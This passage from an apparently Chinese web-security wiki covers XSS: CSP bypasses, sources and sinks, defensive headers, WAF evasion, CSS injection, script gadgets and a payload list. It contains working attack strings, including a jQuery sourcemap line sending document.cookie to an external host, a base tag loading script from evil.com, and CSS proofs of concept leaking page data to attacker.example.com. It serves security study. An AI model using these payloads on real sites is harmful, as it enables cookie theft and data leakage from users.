<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;!-- 预加载某个页面 --&gt;
&lt;link rel=&#39;prefetch&#39; href=&#39;http://xxxx&#39;&gt;&lt;!-- firefox --&gt;
&lt;link rel=&#39;prerender&#39; href=&#39;http://xxxx&#39;&gt;&lt;!-- chrome --&gt;
&lt;!-- 预加载某个图片 --&gt;
&lt;link rel=&#39;prefetch&#39; href=&#39;http://xxxx/x.jpg&#39;&gt;
&lt;!-- DNS 预解析 --&gt;
&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://xxxx&quot;&gt;
&lt;!-- 特定文件类型预加载 --&gt;
&lt;link rel=&#39;preload&#39; href=&#39;//xxxxx/xx.js&#39;&gt;&lt;!-- chrome --&gt;
</pre></div>
</div>
<p>另外，不是所有的页面都能够被预加载，当资源类型如下时，讲阻止预加载操作：</p>
<ul class="simple">
<li>URL中包含下载资源</li>
<li>页面中包含音频、视频</li>
<li>POST、PUT和DELET操作的ajax请求</li>
<li>HTTP认证</li>
<li>HTTPS页面</li>
<li>含恶意软件的页面</li>
<li>弹窗页面</li>
<li>占用资源很多的页面</li>
<li>打开了chrome developer tools开发工具</li>
</ul>
</div>
<div class="section" id="mime-sniff">
<h6>MIME Sniff<a class="headerlink" href="#mime-sniff" title="永久链接至标题">¶</a></h6>
<p>举例来说，csp禁止跨站读取脚本，但是可以跨站读img，那么传一个含有脚本的img，再``&lt;script href='<a class="reference external" href="http://xxx.com/xx.jpg'">http://xxx.com/xx.jpg'</a>&gt;``，这里csp认为是一个img，绕过了检查，如果网站没有回正确的mime type，浏览器会进行猜测，就可能加载该img作为脚本</p>
</div>
<div class="section" id="id7">
<h6>302跳转<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h6>
<p>对于302跳转绕过CSP而言，实际上有以下几点限制：</p>
<ul class="simple">
<li>跳板必须在允许的域内。</li>
<li>要加载的文件的host部分必须跟允许的域的host部分一致</li>
</ul>
</div>
<div class="section" id="iframe">
<h6>iframe<a class="headerlink" href="#iframe" title="永久链接至标题">¶</a></h6>
<p>当可以执行代码时，可以创建一个源为 <code class="docutils literal notranslate"><span class="pre">css</span></code> <code class="docutils literal notranslate"><span class="pre">js</span></code> 等静态文件的frame，在配置不当时，该frame并不存在csp，则在该frame下再次创建frame，达到bypass的目的。同理，使用 <code class="docutils literal notranslate"><span class="pre">../../../</span></code> <code class="docutils literal notranslate"><span class="pre">/%2e%2e%2f</span></code> 等可能触发服务器报错的链接也可以到达相应的目的。</p>
</div>
<div class="section" id="base-uri">
<h6>base-uri<a class="headerlink" href="#base-uri" title="永久链接至标题">¶</a></h6>
<p>当script-src为nonce或无限制，且base-uri无限制时，可通过 <code class="docutils literal notranslate"><span class="pre">base</span></code> 标签修改根URL来bypass，如下加载了http://evil.com/main.js</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">base</span> <span class="n">href</span><span class="o">=</span><span class="s2">&quot;http://evil.com/&quot;</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">script</span> <span class="n">nonce</span><span class="o">=</span><span class="s2">&quot;correct value&quot;</span> <span class="n">src</span><span class="o">=</span><span class="s2">&quot;/main.js&quot;</span><span class="o">&gt;&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
</pre></div>
</div>
</div>
<div class="section" id="id8">
<h6>其他<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h6>
<ul>
<li><p class="first">location 绕过</p>
</li>
<li><p class="first">可上传SVG时，通过恶意SVG绕过同源站点</p>
</li>
<li><p class="first">存在CRLF漏洞且可控点在CSP上方时，可以注入HTTP响应中影响CSP解析</p>
</li>
<li><p class="first">CND Bypass，如果网站信任了某个CDN, 那么可利用相应CDN的静态资源bypass</p>
</li>
<li><p class="first">Angular versions &lt;1.5.9 &gt;=1.5.0，存在漏洞 <a class="reference external" href="https://github.com/angular/angular.js/pull/15346">Git Pull Request</a></p>
</li>
<li><dl class="first docutils">
<dt>jQuery sourcemap</dt>
<dd><div class="first last highlight-default notranslate"><div class="highlight"><pre><span></span>document.write(`&lt;script&gt;
//@        sourceMappingURL=http://xxxx/`+document.cookie+`&lt;\/script&gt;`);``
</pre></div>
</div>
</dd>
</dl>
</li>
<li><p class="first">a标签的ping属性</p>
</li>
<li><p class="first">For FireFox <code class="docutils literal notranslate"><span class="pre">&lt;META</span> <span class="pre">HTTP-EQUIV=&quot;refresh&quot;</span> <span class="pre">CONTENT=&quot;0;</span> <span class="pre">url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=&quot;&gt;</span></code></p>
</li>
<li><p class="first"><code class="docutils literal notranslate"><span class="pre">&lt;link</span> <span class="pre">rel=&quot;import&quot;</span> <span class="pre">/&gt;</span></code></p>
</li>
<li><p class="first"><code class="docutils literal notranslate"><span class="pre">&lt;meta</span> <span class="pre">http-equiv=&quot;refresh&quot;</span> <span class="pre">content=&quot;0;</span> <span class="pre">url=http://....&quot;</span> <span class="pre">/&gt;</span></code></p>
</li>
<li><dl class="first docutils">
<dt>仅限制 <code class="docutils literal notranslate"><span class="pre">script-src</span></code> 时：</dt>
<dd><ul class="first last simple">
<li><code class="docutils literal notranslate"><span class="pre">&lt;object</span> <span class="pre">data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
</div>
</div>
<span id="document-vuln/xss/source"></span><div class="section" id="xss">
<h4>XSS数据源<a class="headerlink" href="#xss" title="永久链接至标题">¶</a></h4>
<div class="section" id="url">
<h5>URL<a class="headerlink" href="#url" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">location</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">location.href</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">location.pathname</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">location.search</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">location.hash</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">document.URL</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">document.documentURI</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">document.baseURI</span></code></li>
</ul>
</div>
<div class="section" id="navigation">
<h5>Navigation<a class="headerlink" href="#navigation" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">window.name</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">document.referrer</span></code></li>
</ul>
</div>
<div class="section" id="communication">
<h5>Communication<a class="headerlink" href="#communication" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">Ajax</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">Fetch</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">WebSocket</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">PostMessage</span></code></li>
</ul>
</div>
<div class="section" id="storage">
<h5>Storage<a class="headerlink" href="#storage" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">Cookie</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">LocalStorage</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">SessionStorage</span></code></li>
</ul>
</div>
</div>
<span id="document-vuln/xss/sink"></span><div class="section" id="sink">
<h4>Sink<a class="headerlink" href="#sink" title="永久链接至标题">¶</a></h4>
<div class="section" id="javascript">
<h5>执行JavaScript<a class="headerlink" href="#javascript" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">eval(payload)</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">setTimeout(payload,</span> <span class="pre">100)</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">setInterval(payload,</span> <span class="pre">100)</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">Function(payload)()</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;payload&lt;/script&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;img</span> <span class="pre">src=x</span> <span class="pre">onerror=payload&gt;</span></code></li>
</ul>
</div>
<div class="section" id="url">
<h5>加载URL<a class="headerlink" href="#url" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">location=javascript:alert(/xss/)</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">location.href=javascript:alert(/xss/)</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">location.assign(javascript:alert(/xss/))</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">location.replace(javascript:alert(/xss/))</span></code></li>
</ul>
</div>
<div class="section" id="html">
<h5>执行HTML<a class="headerlink" href="#html" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">xx.innerHTML=payload</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">xx.outerHTML=payload</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">document.write(payload)</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">document.writeln(payload)</span></code></li>
</ul>
</div>
</div>
<span id="document-vuln/xss/mitigation"></span><div class="section" id="xss">
<h4>XSS保护<a class="headerlink" href="#xss" title="永久链接至标题">¶</a></h4>
<div class="section" id="html">
<h5>HTML过滤<a class="headerlink" href="#html" title="永久链接至标题">¶</a></h5>
<p>使用一些白名单或者黑名单来过滤用户输入的HTML，以实现过滤的效果。例如DOMPurify等工具都是用该方式实现了XSS的保护。</p>
</div>
<div class="section" id="x-frame">
<h5>X-Frame<a class="headerlink" href="#x-frame" title="永久链接至标题">¶</a></h5>
<p>X-Frame-Options 响应头有三个可选的值：</p>
<ul class="simple">
<li><dl class="first docutils">
<dt>DENY</dt>
<dd><ul class="first last">
<li>页面不能被嵌入到任何iframe或frame中</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>SAMEORIGIN</dt>
<dd><ul class="first last">
<li>页面只能被本站页面嵌入到iframe或者frame中</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>ALLOW-FROM</dt>
<dd><ul class="first last">
<li>页面允许frame或frame加载</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id1">
<h5>XSS保护头<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<p>基于 Webkit 内核的浏览器(比如Chrome)在特定版本范围内有一个名为XSS auditor的防护机制，如果浏览器检测到了含有恶意代码的输入被呈现在HTML文档中，那么这段呈现的恶意代码要么被删除，要么被转义，恶意代码不会被正常的渲染出来。</p>
<p>而浏览器是否要拦截这段恶意代码取决于浏览器的XSS防护设置。</p>
<p>要设置浏览器的防护机制，则可使用X-XSS-Protection字段
该字段有三个可选的值</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">0</span></code> : 表示关闭浏览器的XSS防护机制</li>
<li><code class="docutils literal notranslate"><span class="pre">1</span></code> : 删除检测到的恶意代码， 如果响应报文中没有看到 X-XSS-Protection 字段，那么浏览器就认为X-XSS-Protection配置为1，这是浏览器的默认设置</li>
<li><code class="docutils literal notranslate"><span class="pre">1;</span> <span class="pre">mode=block</span></code> : 如果检测到恶意代码，在不渲染恶意代码</li>
</ul>
<p>FireFox没有相关的保护机制，如果需要保护，可使用NoScript等相关插件。</p>
</div>
</div>
<span id="document-vuln/xss/wafbypass"></span><div class="section" id="waf-bypass">
<h4>WAF Bypass<a class="headerlink" href="#waf-bypass" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>利用&lt;&gt;标记</li>
<li><dl class="first docutils">
<dt>利用html属性</dt>
<dd><ul class="first last">
<li>href</li>
<li>lowsrc</li>
<li>bgsound</li>
<li>background</li>
<li>value</li>
<li>action</li>
<li>dynsrc</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>关键字</dt>
<dd><ul class="first last">
<li>利用回车拆分</li>
<li><dl class="first docutils">
<dt>字符串拼接</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">window[&quot;al&quot;</span> <span class="pre">+</span> <span class="pre">&quot;ert&quot;]</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>利用编码绕过</dt>
<dd><ul class="first last">
<li>base64</li>
<li>jsfuck</li>
<li>String.fromCharCode</li>
<li>HTML</li>
<li>URL</li>
<li><dl class="first docutils">
<dt>hex</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">window[&quot;\x61\x6c\x65\x72\x74&quot;]</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>unicode</li>
<li><dl class="first docutils">
<dt>utf7</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">+ADw-script+AD4-alert('XSS')+ADsAPA-/script+AD4-</span></code></li>
</ul>
</dd>
</dl>
</li>
<li>utf16</li>
</ul>
</dd>
</dl>
</li>
<li>大小写混淆</li>
<li>对标签属性值转码</li>
<li>产生事件</li>
<li>css跨站解析</li>
<li><dl class="first docutils">
<dt>长度限制bypass</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">eval(name)</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">eval(hash)</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">import</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">$.getScript</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">$.get</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><code class="docutils literal notranslate"><span class="pre">.</span></code></dt>
<dd><ul class="first last">
<li>使用 <code class="docutils literal notranslate"><span class="pre">。</span></code> 绕过IP/域名</li>
<li><code class="docutils literal notranslate"><span class="pre">document['cookie']</span></code> 绕过属性取值</li>
</ul>
</dd>
</dl>
</li>
<li>过滤引号用 `` ` `` 绕过</li>
</ul>
</div>
<span id="document-vuln/xss/trick/index"></span><div class="section" id="id1">
<h4>技巧<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="toctree-wrapper compound">
<span id="document-vuln/xss/trick/httponly"></span><div class="section" id="httponly">
<h5>httponly<a class="headerlink" href="#httponly" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>在cookie为httponly的情况下，可以通过xss直接在源站完成操作，不直接获取cookie。</li>
<li>在有登录操作的情况下，部分站点直接发送登录请求可能会带有cookie</li>
<li>部分特定版本的浏览器可能会在httponly支持/处理上存在问题</li>
<li>低版本浏览器支持 TRACE / TRACK，可获取敏感的header字段</li>
<li>phpinfo 等页面可能会回显信息，这些信息中包含http头</li>
<li>通过xss劫持页面钓鱼</li>
<li>通过xss伪造oauth等授权请求，远程登录</li>
</ul>
</div>
<span id="document-vuln/xss/trick/cssi"></span><div class="section" id="css">
<h5>CSS 注入<a class="headerlink" href="#css" title="永久链接至标题">¶</a></h5>
<div class="section" id="id1">
<h6>基本介绍<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h6>
<p>CSS注入最早开始于利用CSS中的 <code class="docutils literal notranslate"><span class="pre">expression()</span></code> <code class="docutils literal notranslate"><span class="pre">url()</span></code> <code class="docutils literal notranslate"><span class="pre">regex()</span></code> 等函数或特性来引入外部的恶意代码，但是随着浏览器的发展，这种方式被逐渐禁用，与此同时，出现了一些新的攻击方式。</p>
</div>
<div class="section" id="css-selectors">
<h6>CSS selectors<a class="headerlink" href="#css-selectors" title="永久链接至标题">¶</a></h6>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">style</span><span class="o">&gt;</span>
    <span class="c1">#form2 input[value^=&#39;a&#39;] { background-image: url(http://localhost/log.php/a); }</span>
    <span class="c1">#form2 input[value^=&#39;b&#39;] { background-image: url(http://localhost/log.php/b); }</span>
    <span class="c1">#form2 input[value^=&#39;c&#39;] { background-image: url(http://localhost/log.php/c); }</span>
    <span class="p">[</span><span class="o">...</span><span class="p">]</span>
<span class="o">&lt;/</span><span class="n">style</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">form</span> <span class="n">action</span><span class="o">=</span><span class="s2">&quot;http://example.com&quot;</span> <span class="nb">id</span><span class="o">=</span><span class="s2">&quot;form2&quot;</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nb">id</span><span class="o">=</span><span class="s2">&quot;secret&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;secret&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;abc&quot;</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="n">form</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>上图是利用CSS selectors完成攻击的一个示例</p>
</div>
<div class="section" id="abusing-unicode-range">
<h6>Abusing Unicode Range<a class="headerlink" href="#abusing-unicode-range" title="永久链接至标题">¶</a></h6>
<p>当可以插入CSS的时候，可以使用 <code class="docutils literal notranslate"><span class="pre">font-face</span></code> 配合 <code class="docutils literal notranslate"><span class="pre">unicode-range</span></code> 获取目标网页对应字符集。PoC如下</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;style&gt;
@font-face{
 font-family:poc;
 src: url(http://attacker.example.com/?A); /* fetched */
 unicode-range:U+0041;
}
@font-face{
 font-family:poc;
 src: url(http://attacker.example.com/?B); /* fetched too */
 unicode-range:U+0042;
}
@font-face{
 font-family:poc;
 src: url(http://attacker.example.com/?C); /* not fetched */
 unicode-range:U+0043;
}
#sensitive-information{
 font-family:poc;
}
&lt;/style&gt;
&lt;p id=&quot;sensitive-information&quot;&gt;AB&lt;/p&gt;
</pre></div>
</div>
<p>当字符较多时，则可以结合 <code class="docutils literal notranslate"><span class="pre">::first-line</span></code>  等CSS属性缩小范围，以获取更精确的内容</p>
</div>
</div>
<span id="document-vuln/xss/trick/gadget"></span><div class="section" id="bypass-via-script-gadgets">
<h5>Bypass Via Script Gadgets<a class="headerlink" href="#bypass-via-script-gadgets" title="永久链接至标题">¶</a></h5>
<div class="section" id="id1">
<h6>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h6>
<p>一些网站会使用白名单或者一些基于DOM的防御方式，对这些方式，有一种被称为 <code class="docutils literal notranslate"><span class="pre">Code</span> <span class="pre">Reuse</span></code> 的攻击方式可以绕过。该方式和二进制攻防中的Gadget相似，使用目标中的合法代码来达到绕过防御措施的目的。在论文 <code class="docutils literal notranslate"><span class="pre">Code-Reuse</span> <span class="pre">Attacks</span> <span class="pre">for</span> <span class="pre">the</span> <span class="pre">Web:</span> <span class="pre">Breaking</span> <span class="pre">Cross-Site</span> <span class="pre">Scripting</span> <span class="pre">Mitigations</span> <span class="pre">via</span> <span class="pre">Script</span> <span class="pre">Gadgets</span></code> 中有该方法的具体描述。</p>
<p>portswigger的一篇博文也表达了类似的想法 <code class="docutils literal notranslate"><span class="pre">https://portswigger.net/blog/abusing-javascript-frameworks-to-bypass-xss-mitigations</span></code>。</p>
<p>下面有一个简单的例子，这个例子使用了 <code class="docutils literal notranslate"><span class="pre">DOMPurify</span></code> 来加固，但是因为引入了 <code class="docutils literal notranslate"><span class="pre">jquery.mobile.js</span></code> 导致可以被攻击。</p>
</div>
<div class="section" id="id2">
<h6>例子<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h6>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>// index.php
&lt;?php

$msg = $_GET[&#39;message&#39;];
$msg = str_replace(&quot;\n&quot;, &quot;&quot;, $msg);
$msg = base64_encode($msg);

?&gt;

&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;Preview&lt;/title&gt;
    &lt;script type=&quot;text/javascript&quot; src=&quot;purify.js&quot;&gt;&lt;/script&gt;
    &lt;script type=&quot;text/javascript&quot; src=&quot;jquery.js&quot;&gt;&lt;/script&gt;
    &lt;script type=&quot;text/javascript&quot; src=&quot;jquery.mobile.js&quot;&gt;&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;

    &lt;script type=&quot;text/javascript&quot;&gt;
    var d= atob(&#39;&lt;?php echo $msg; ?&gt;&#39;);
    var cleanvar = DOMPurify.sanitize(d);
    document.write(cleanvar);
    &lt;/script&gt;

&lt;/body&gt;
&lt;/html&gt;
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">//</span> <span class="n">payload</span>
<span class="o">&lt;</span><span class="n">div</span> <span class="n">data</span><span class="o">-</span><span class="n">role</span><span class="o">=</span><span class="n">popup</span> <span class="nb">id</span><span class="o">=</span><span class="s1">&#39;--&gt;</span>
<span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">script</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">/</span><span class="n">script</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="s1">&#39;&gt;</span>
<span class="o">&lt;/</span><span class="n">div</span><span class="o">&gt;</span>
</pre></div>
</div>
</div>
</div>
<span id="document-vuln/xss/trick/rpo"></span><div class="section" id="rpo-relative-path-overwrite">
<h5>RPO(Relative Path Overwrite)<a class="headerlink" href="#rpo-relative-path-overwrite" title="永久链接至标题">¶</a></h5>
<p>RPO(Relative Path Overwrite) 攻击又称为相对路径覆盖攻击，依赖于浏览器和网络服务器的反应，利用服务器的 Web 缓存技术和配置差异。</p>
</div>
</div>
</div>
<span id="document-vuln/xss/payload"></span><div class="section" id="payload">
<h4>Payload<a class="headerlink" href="#payload" title="永久链接至标题">¶</a></h4>
<div class="section" id="id1">
<h5>常用<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;svg</span> <span class="pre">onload=alert(document.domain)&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;img</span> <span class="pre">src=document.domain</span> <span class="pre">onerror=alert(document.domain)&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;M</span> <span class="pre">onmouseover=alert(document.domain)&gt;M</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;marquee</span> <span class="pre">onscroll=alert(document.domain)&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;a</span> <span class="pre">href=javascript:alert(document.domain)&gt;M&lt;/a&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;body</span> <span class="pre">onload=alert(document.domain)&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;details</span> <span class="pre">open</span> <span class="pre">ontoggle=alert(document.domain)&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;embed</span> <span class="pre">src=javascript:alert(document.domain)&gt;</span></code></li>
</ul>
</div>
<div class="section" id="id2">
<h5>大小写绕过<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;alert(1)&lt;/script&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;sCrIpT&gt;alert(1)&lt;/sCrIpT&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;sCrIpT&gt;alert(1)&lt;/ScRiPt&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;img</span> <span class="pre">src=1</span> <span class="pre">onerror=alert(1)&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;iMg</span> <span class="pre">src=1</span> <span class="pre">oNeRrOr=alert(1)&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;ImG</span> <span class="pre">src=1</span> <span class="pre">OnErRoR=alert(1)&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;img</span> <span class="pre">src=1</span> <span class="pre">onerror=&quot;alert(&amp;quot;M&amp;quot;)&quot;&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;marquee</span> <span class="pre">onscroll=alert(1)&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;mArQuEe</span> <span class="pre">OnScRoLl=alert(1)&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;MaRqUeE</span> <span class="pre">oNsCrOlL=alert(1)&gt;</span></code></li>
</ul>
</div>
<div class="section" id="alert">
<h5>各种alert<a class="headerlink" href="#alert" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;alert(1)&lt;/script&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;confirm(1)&lt;/script&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;prompt(1)&lt;/script&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;alert('1')&lt;/script&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;alert(&quot;1&quot;)&lt;/script&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;alert`1`&lt;/script&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;(alert)(1)&lt;/script&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;a=alert,a(1)&lt;/script&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;[1].find(alert)&lt;/script&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](1)&lt;/script&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;top[&quot;a&quot;+&quot;l&quot;+&quot;e&quot;+&quot;r&quot;+&quot;t&quot;](1)&lt;/script&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;top[/al/.source+/ert/.source](1)&lt;/script&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;top[/a/.source+/l/.source+/e/.source+/r/.source+/t/.source](1)&lt;/script&gt;</span></code></li>
</ul>
</div>
<div class="section" id="id3">
<h5>伪协议<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">&lt;a</span> <span class="pre">href=javascript:/0/,alert(%22M%22)&gt;M&lt;/a&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;a</span> <span class="pre">href=javascript:/00/,alert(%22M%22)&gt;M&lt;/a&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;a</span> <span class="pre">href=javascript:/000/,alert(%22M%22)&gt;M&lt;/a&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;a</span> <span class="pre">href=javascript:/M/,alert(%22M%22)&gt;M&lt;/a&gt;</span></code></li>
</ul>
</div>
<div class="section" id="chrome-xss-auditor-bypass">
<h5>Chrome XSS auditor bypass<a class="headerlink" href="#chrome-xss-auditor-bypass" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">?param=https://&amp;param=&#64;z.exeye.io/import%20rel=import%3E</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;base</span> <span class="pre">href=javascript:/M/&gt;&lt;a</span> <span class="pre">href=,alert(1)&gt;M&lt;/a&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;base</span> <span class="pre">href=javascript:/M/&gt;&lt;iframe</span> <span class="pre">src=,alert(1)&gt;&lt;/iframe&gt;</span></code></li>
</ul>
</div>
<div class="section" id="id4">
<h5>长度限制<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span><span class="n">s</span><span class="o">+=</span><span class="s2">&quot;l&quot;</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
\<span class="o">...</span>
<span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span><span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
</pre></div>
</div>
</div>
<div class="section" id="jquery-sourcemappingurl">
<h5>jquery sourceMappingURL<a class="headerlink" href="#jquery-sourcemappingurl" title="永久链接至标题">¶</a></h5>
<blockquote>
<div><code class="docutils literal notranslate"><span class="pre">&lt;/textarea&gt;&lt;script&gt;var</span> <span class="pre">a=1//&#64;</span> <span class="pre">sourceMappingURL=//xss.site&lt;/script&gt;</span></code></div></blockquote>
</div>
<div class="section" id="id5">
<h5>图片名<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<blockquote>
